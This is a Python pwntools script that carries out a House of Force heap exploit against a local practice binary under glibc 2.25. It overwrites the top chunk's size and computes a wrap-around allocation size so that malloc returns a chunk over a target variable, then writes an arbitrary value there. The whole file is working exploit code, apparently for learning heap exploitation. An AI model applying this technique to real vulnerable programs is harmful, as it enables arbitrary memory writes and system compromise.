from pwn import *

def set_condition():
	#1. evil_size
	#1.1 target : bss_var
	p.sendline('3')
	p.recvuntil('<stack_var_1>\naddress : ')
	target = int(p.recvline()[0:-1], 16)
	print "[+] target = " + str(hex(target))
	p.sendline('4')
	#2. old_top
	#2.1 usable size of A
	p.sendline('1')
	p.sendline('2')
	p.sendline('0')
	p.recvuntil('<Chunk 0>\n')
	p.recvuntil('\nsize : ')
	size = int(p.recvline()[0:-1], 16)  - 1 - 0x8
	print "[+] size = " + str(size)
	p.recvuntil('data : \n')
	#2.2 old_top = A + malloc_usable_size(A) - 0x8
	old_top = int(p.recvline()[0:18], 16) + size - 0x8 #old_top pointes old_top.prev_size
	print "[+] old_top = " + str(hex(old_top))
	p.sendline('3')
	#3. evil_size = target - old_top - 2*2*SIZE_SZ
	evil_size = target - old_top - 2*2*0x8

	return str(evil_size)

	
def exploit():
	#malloc(size)
	p.sendline('1')
	p.sendline('1')
	p.sendline('1024')
	sleep(1)
	print "[+] malloc(size)"
	#top_chunk.size = 0xffffffffffffffff
	p.sendline('1')
	p.sendline('2')
	p.sendline('0')
	p.sendline('1')
	p.sendline('A'*1032 + p64(0xffffffffffffffff))
	sleep(1)
	evil_size = set_condition()
	sleep(1)
	print "[+] evil size = " + hex(int(evil_size))
	#malloc(evil_size)
	p.sendline('1')
	p.sendline('1')
	p.sendline(evil_size)
	sleep(1)
	print "[+] malloc(evil_size)"
	#malloc(Size)
	p.sendline('1')
	p.sendline('1')
	p.sendline('512')
	sleep(1)
	print "[+] malloc(Size)"



def proof():
	#write arbitary value via allocated chunk
	p.sendline('1')
	p.sendline('2')
	p.sendline('2')
	p.recvuntil('<Chunk 2>\naddress : ')
	p.sendline('1')
	p.sendline('EXPLOITED' + p64(0xdeadbeef))
	sleep(1)
	print 'chunk address = ' + p.recvline()
	p.sendline('3')
	#stack value is modified
	p.sendline('3')
	p.recvuntil('<stack_var_1>\naddress : ')
	print p.recvuntil('<end>\n')


argv = ['./glibc_run.sh', '2.25', './heap_world']
p = process(executable = './glibc_run.sh', argv = argv)

exploit()
proof()

p.close()
